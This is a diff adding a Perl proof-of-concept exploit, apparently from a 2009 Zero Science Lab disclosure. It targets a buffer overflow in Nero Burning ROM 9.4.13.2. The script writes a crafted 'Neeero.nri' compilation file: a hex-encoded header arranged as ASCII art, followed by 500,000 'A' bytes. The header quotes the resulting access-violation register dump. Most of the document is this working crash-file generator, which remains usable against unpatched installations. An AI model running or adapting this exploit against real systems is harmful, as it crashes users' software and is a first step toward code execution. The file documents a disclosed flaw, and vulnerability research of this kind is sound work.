@@ -1,0 +1,83 @@
+#!/usr/bin/perl
+#
+#
+# Title: Nero Burning ROM 9 (iso compilation) Local Buffer Invasion Proof Of Concept
+#
+#
+# Product web page: http://www.nero.com
+# Version tested: 9.4.13.2
+# OS platform used: Microsoft Windows XP Professional SP3 (English)
+#
+# Registers pick'a'chu:
+# ------------------------------------------------------------------------
+#
+# (adc.b30): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=41414141 ebx=00000000 ecx=0012ecf0 edx=00000000 esi=04c8acc8 edi=00e29890
+# eip=0057f53c esp=0012ec38 ebp=0012ed28 iopl=0         nv up ei pl nz na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+# Nero+0x17f53c:
+# 0057f53c 394204          cmp     dword ptr [edx+4],eax ds:0023:00000004=????????
+#
+# ------------------------------------------------------------------------
+#
+# Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
+#
+# liquidworm gmail com
+#
+# Zero Science Lab - http://www.zeroscience.org
+#
+# 30.09.2009
+#
+# Advisory: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4927.php
+#
+
+
+           
+              ##          ##
+             #  #        #  #
+            #    #      #    #
+           #O     #    #     O#
+          #[*]     #  #     [*]#
+                   ####
+              $id="\xFF\xFE".
+ 	   "\xFF\x0E\x4E\x00".
+          "\x65\x00\x72\x00\x6F".
+        "\x00\x49\x00\x53\x00\x4F".
+      #####===###_O----O_###===##### 
+      "\x00\x30\x00\x2E\x00\x30\x00".
+      "\x33\x00\x2E\x00\x30\x00\x31".
+        "\x00\x0B\x00\x00\x00\x01".
+         "\x00\x00\x00\x00\x00".
+                "\x10\x4E".
+                  "\x45".
+                  "\x52".
+                  "\x4F".
+        "\x20\x42\x55\x52\x4E\x49".
+     "\x4E".    "\x47\x20".   "\x52".
+   "\x4F".    "\x4D\x00\x00".    "\x00".
+   "\x9C".   "\x20\xBC\x4A\x9C". "\x20".
+    "\xBC".    "\x4A\xFF\xFF".  "\xFF".
+    "\xFF".    "\xFF\xFF\xFF".  "\xFF".
+   "\x00".       "\x00\x00".     "\x00".
+   "\x9F".    "\x20".   "\xBC".  "\x4A".
+   "\x01".  "\x00".       "\x00"."\x00".
+    "\x00". "\x00".       "\x00"."\x00".
+    "\x01"."\x00\x00". "\x00\x01"."\x00".
+    "\x00".                       "\x00".
+    "\x01".                       "\x00".
+     "\x00".                     "\x00".
+     "\x00".                     "\x00".
+       "\x00".                 "\x00";
+###############################################
+###############################################
+
+
+
+							$fl="Neeero.nri";$op="\x41" x 500000;
+							open nri, ">./$fl" || die "\nCan't open $fl: $!";
+							print nri $id.$op;
+							print "\n ~ Invasion started...\n";
+							sleep 1;close nri;
+							print "\n ~ File $fl invaded host.\n";
